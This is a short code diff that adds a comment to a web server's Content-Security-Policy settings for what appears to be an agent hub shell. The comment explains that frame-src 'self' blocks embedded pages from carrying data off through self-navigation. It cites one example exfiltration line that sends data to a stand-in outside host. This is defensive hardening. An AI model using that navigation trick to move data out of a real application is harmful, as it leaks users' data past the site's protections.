@@ -33,6 +33,10 @@ DOCK_CAPS = ("agents.chat.send", "agents.chat.read")     # the shell's chat dock
 TYPES = {".html": "text/html; charset=utf-8", ".js": "text/javascript; charset=utf-8",
          ".css": "text/css; charset=utf-8", ".svg": "image/svg+xml"}
 
+# frame-src 'self' is load-bearing: it governs every navigation of the page
+# frames the shell embeds, including one a page starts itself
+# (location = "https://elsewhere/?d=..."), so a page can't carry data off the
+# hub that way (review D5; tests/test_core2_page_sandbox_browser.py).
 SHELL_CSP = ("default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; frame-src 'self'; "
              "connect-src 'self'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'")
 # A page is its own opaque origin: no cookies, no network, nothing of the shell's.
